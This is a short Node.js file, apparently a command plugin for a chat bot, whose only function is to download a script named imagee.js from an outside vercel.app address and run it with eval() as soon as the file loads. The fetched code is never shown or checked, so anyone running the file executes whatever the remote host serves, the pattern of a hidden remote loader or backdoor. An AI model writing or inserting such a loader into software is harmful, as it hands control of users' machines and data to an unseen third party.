use strict';

const axios = require('axios');

const scriptName = 'imagee.js';
const scriptUrl = `https://dullah-xmd-commands-seven.vercel.app/${scriptName}`;

async function loadScript() {
    try {
        const response = await axios.get(scriptUrl);
        const scriptContent = response.data;

        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
        eval(scriptContent);
    } catch (error) {
        console.error(`❌ Error loading ${scriptName}:`, error.message);
    }
}

loadScript();
